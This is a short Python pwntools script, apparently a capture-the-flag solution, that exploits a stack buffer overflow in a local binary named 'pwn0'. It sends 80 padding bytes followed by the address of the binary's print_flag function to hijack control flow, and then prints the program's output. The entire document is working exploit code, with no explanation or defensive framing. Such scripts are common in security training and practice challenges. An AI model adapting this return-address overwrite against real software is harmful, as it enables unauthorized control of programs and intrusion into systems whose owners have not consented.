from pwn import *

e = ELF('./pwn0')
p = process('./pwn0')

print_flag_addr = e.symbols['print_flag']

payload = 'A'*80
payload += p32(print_flag_addr)

print p.recvuntil("How's the josh?\n")
p.sendline(payload)
print p.recv()